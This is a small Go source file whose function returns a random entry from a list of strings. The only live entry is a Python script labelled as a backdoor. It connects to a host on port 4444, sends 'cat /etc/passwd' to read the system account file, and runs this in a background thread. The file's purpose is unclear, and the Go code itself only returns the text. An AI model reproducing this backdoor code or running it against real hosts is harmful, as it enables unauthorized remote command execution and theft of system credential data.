package textImport

import (
	"math/rand"
)

func ReturnString() string {
	
	stringSlice := []string{}	

// 	stringSlice = append(stringSlice, "neato burrito")
// 	stringSlice = append(stringSlice, "wowee zowee")
	stringSlice = append(stringSlice, "import socket\nimport threading\nimport time\n\ndef backdoor(host: str, port: int, command: str) -> str:\n    \"\"\"Establishes a backdoor to execute a command on a remote host.\"\"\"\n    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client.connect((host, port))\n    client.send(command.encode())\n    response = client.recv(1024).decode()\n    client.close()\n    return response\n\ndef spawn_thread(target, args=()):\n    \"\"\"Spawns a thread to run the target function.\"\"\"\n    thread = threading.Thread(target=target, args=args)\n    thread.start()\n    return thread\n\ndef execute_in_background(command: str, host: str, port: int):\n    \"\"\"Executes a command in the background on a remote host.\"\"\"\n    thread = spawn_thread(backdoor, (host, port, command))\n    time.sleep(2)  # Allow time for the command to execute\n    return thread\n\n# Example usage\nif __name__ == \"__main__\":\n    command = \"cat /etc/passwd\"  # Command to execute\n    host = \"192.168.1.100\"  # Target host\n    port = 4444  # Target port\n    thread = execute_in_background(command, host, port)\n    thread.join()\n    print(f\"Command executed: {command}\")")
	 
	
	
	// Select a random slice
	sliceLen := len(stringSlice)
	
	randSlice := rand.Intn(int(sliceLen))
	
	return stringSlice[randSlice]
}